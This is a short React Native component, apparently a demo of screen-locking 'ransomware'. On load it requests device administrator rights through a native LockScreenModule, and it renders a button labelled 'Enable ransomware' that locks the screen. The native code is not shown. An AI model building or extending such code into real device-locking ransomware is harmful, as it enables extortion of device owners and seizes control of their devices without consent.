import React from 'react';
import {Alert, Text, TouchableOpacity, View, NativeModules} from 'react-native';
const {LockScreenModule} = NativeModules;

function CustomButton({title, onPress}: any): JSX.Element {
  return (
    <TouchableOpacity
      onPress={onPress}
      style={{
        backgroundColor: '#2980b9',
        padding: 10,
        width: 200,
        alignItems: 'center',
        borderRadius: 5,
      }}>
      <Text style={{color: 'white', fontWeight: 'bold'}}>{title}</Text>
    </TouchableOpacity>
  );
}

function onPress() {
  //Alert.alert('You tapped the button! Locking screen...');
  LockScreenModule.lockScreen();
}

function enableAdmin() {
  //Alert.alert('You tapped the button! Enabling admin...');
  LockScreenModule.enableAdmin();
}

function Locker(): JSX.Element {
  LockScreenModule.isAdminActive((result: boolean) => {
    if (!result) {
      enableAdmin();
    }
  });

  return (
    <View style={{flex: 1, justifyContent: 'center', alignItems: 'center'}}>
      <CustomButton title="Enable ransomware" onPress={onPress} />
    </View>
  );
}

export default Locker;
